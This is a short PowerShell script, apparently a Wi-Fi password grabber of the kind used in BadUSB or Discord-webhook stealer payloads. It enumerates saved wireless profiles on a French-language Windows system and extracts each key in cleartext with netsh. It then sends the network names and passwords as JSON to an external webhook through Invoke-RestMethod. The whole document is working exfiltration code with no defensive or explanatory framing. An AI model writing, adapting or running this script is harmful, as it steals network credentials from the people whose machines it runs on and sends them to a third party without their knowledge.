$wifiProfiles = netsh wlan show profiles | Select-String "Profil Tous les utilisateurs" | ForEach-Object {
    ($_ -split ":")[1].Trim()
}

$wifiList = @()
foreach ($profile in $wifiProfiles) {
    $details = netsh wlan show profile name="$profile" key=clear
    $keyLine = $details | Select-String "Contenu de la clé"

    if ($keyLine) {
        $key = ($keyLine -split ":")[1].Trim()
        $keyMasked = "||$key||"
    } else {
        $keyMasked = "Aucune clé trouvée"
    }

    $wifiList += "📶 Réseau : $profile`n🔑 Clé : $keyMasked`n"
}

$message = $wifiList -join "`n"

$payload = @{
    content = $message
} | ConvertTo-Json -Compress

$utf8 = [System.Text.Encoding]::UTF8.GetBytes($payload)
Invoke-RestMethod -Uri $webhook -Method Post -Body $utf8 -ContentType 'application/json'

#fixed